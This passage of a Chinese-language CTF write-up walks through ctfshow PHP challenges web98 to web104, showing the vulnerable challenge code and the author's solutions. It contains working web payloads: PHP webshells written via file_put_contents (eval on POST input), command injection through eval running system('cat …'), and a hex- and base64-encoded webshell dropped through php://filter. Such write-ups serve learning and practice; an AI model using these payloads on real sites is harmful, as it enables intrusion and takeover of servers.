punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html" target="_blank" rel="noopener">php三元运算符与if的详解</a></p><p><a href="https://www.php.cn/php-notebook-172859.html" target="_blank" rel="noopener">php函数的传值与传址(引用)详解</a></p><p>举例分析：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面的也是同理</p><p>直到最后一句</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">==</span><span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>既然get传入的值会被定位指向到post所对应的值，那么只需要有get存在即可，同时post传入HTTP_FLAG=flag就可以了</p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-array-push.html" target="_blank" rel="noopener">array_push() 函数</a>：向数组尾部插入一个或多个元素</p><p><a href="https://www.runoob.com/php/func-math-rand.html" target="_blank" rel="noopener">rand() 函数</a>随机生成数组rand(min,max)</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html" target="_blank" rel="noopener">file_put_contents() 函数</a>：写入函数</p><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>n<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">.</span>phpcontent<span class="token operator">=</span><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>content<span class="token operator">=</span><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat flag36d.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$v2('ctfshow')$v3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.jb51.net/article/42425.htm" target="_blank" rel="noopener">php中OR与|| AND与&amp;&amp;的区别总结</a></p><p>因为赋值的优先级(=)高于and所以$v0的值可以由$v1来控制，所以我们需要给其赋值为1也就是true</p><p>因为flag在类ctfshow中，所以可以直接命令执行</p><pre><code>?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)/*&amp;v3=*/;</code></pre><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$v2('ctfshow')$v3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里牵扯到的是一个反射类的问题</p><p><a href="https://ask.dcloud.net.cn/article/631" target="_blank" rel="noopener">php反射类 ReflectionClass使用例子</a></p><p><a href="https://www.huaweicloud.com/articles/12460007.html" target="_blank" rel="noopener">PHP的反射类ReflectionClass、ReflectionMethod使用实例</a></p><p><a href="https://learnku.com/articles/7538/the-application-of-reflection-in-php" target="_blank" rel="noopener">反射在 PHP 中的应用</a></p><p>看了半天，大概知道了</p><p>反射类可以说成是类的一个映射，可以利用反射类来代替有关类的应用的任何语句</p><p>其属性为类的一个名称，这道题目里面类的名称为ctfshow</p><p><strong>payload：</strong><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><p><strong>举个例子</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">hacker</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$hackername</span> <span class="token operator">=</span> <span class="token string">"yn8rt"</span><span class="token punctuation">;</span>    <span class="token keyword">const</span>  yn8rt<span class="token operator">=</span><span class="token string">'nb666'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token keyword">function</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">,</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//有这么一个hacker类，假设我们不知道这个类是干什么用的，我们需要知道类里面的信息，这时候就需要用到ReflectionClass来对类进行反射</span><span class="token comment" spellcheck="true">//现在我可以通过反射来获取这个类中的方法，属性，常量</span><span class="token comment" spellcheck="true">//通过反射获取类的信息</span><span class="token variable">$reflection</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReflectionClass</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//实例化反射对象,映射hacker类的信息</span><span class="token variable">$consts</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getConstants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取所有常量</span><span class="token variable">$props</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getProperties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取所有属性</span><span class="token variable">$methods</span> <span class="token operator">=</span> <span class="token variable">$reflection</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取所有方法</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$consts</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$props</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$methods</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>返回值</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token string">"yn8rt"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"nb666"</span><span class="token punctuation">}</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">&amp;</span><span class="token function">object</span><span class="token punctuation">(</span>ReflectionProperty<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (2) {</span>    <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token string">"hackername"</span>    <span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"hacker"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>  <span class="token operator">&amp;</span><span class="token function">object</span><span class="token punctuation">(</span>ReflectionMethod<span class="token punctuation">)</span><span class="token shell-comment comment">#3 (2) {</span>    <span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"show"</span>    <span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>    <span class="token function">string</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"hacker"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果没有指定方法的话，就会像题目中默认输出很多东西：</p><p>1.常量 Contants<br>2.属性 Property Names<br>3.方法 Method Names静态<br>4.属性 Static Properties<br>5.命名空间 Namespace<br>6.Person类是否为final或者abstract<br>7.Person类是否有某个方法</p><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 这里的意思是从第二位开始截取</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 回调函数，第一个参数为调用的函数，其余的为调用参数的值</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-string-substr.html" target="_blank" rel="noopener">PHP substr() 函数</a></p><p><a href="https://www.runoob.com/php/func-string-hex2bin.html" target="_blank" rel="noopener">PHP hex2bin() 函数</a>：参数只有一个，将传入的参数(16进制转换为ascii字符)</p><p>首先还是赋值与and的优先级问题，所以就要保证v2传入的值为经过is_numeric函数判断后返回的结果为true，然后就是利用回调函数来实现读取操作</p><p>所以就可以这么利用啊：</p><p><code>post:v1=hex2bin</code></p><p><code>get：?v2=0x3c3f706870206576616c28245f504f53545b27796e275d293b3f3e&amp;v3=yn.php</code></p><p>上面的16进制解码ascii：<code>&lt;?php eval($_POST[&#39;yn&#39;]);?&gt;</code></p><p>但是有个什么问题：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token string">"0x66"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 在php5中返回值为true</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token string">"0x66"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 在php7中返回值为false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>但是本题的环境就是php7啊</p><h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>利用base64，同时配合伪协议去写入，但是需要保证通过is_number函数的判断，可以有字母啊，但是必得是e啊，也就是科学计数法啊，来自同一家的payload啊：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// PD89YGNhdCAqYDs=</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//这里直接用去掉=的base64</span>输出   <span class="token number">5044383959474e6864434171594473</span>带e的话会被认为是科学计数法，可以通过is_numeric检测。大家可以尝试下去掉<span class="token operator">=</span>和带着<span class="token operator">=</span>的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</code></p><p>post：v1=hex2bin</p><p>然后访问1.php去触发就可以了</p><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个地方的的匹配似乎毫无意义，只是为了让写入的文件中没有php，但是根据上一个题目的payload来看，也不需要php标签啊</p><h2 id="web104、web106"><a href="#web104、web106" class="headerlink" title="web104、web106"></a>web104、web106</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span 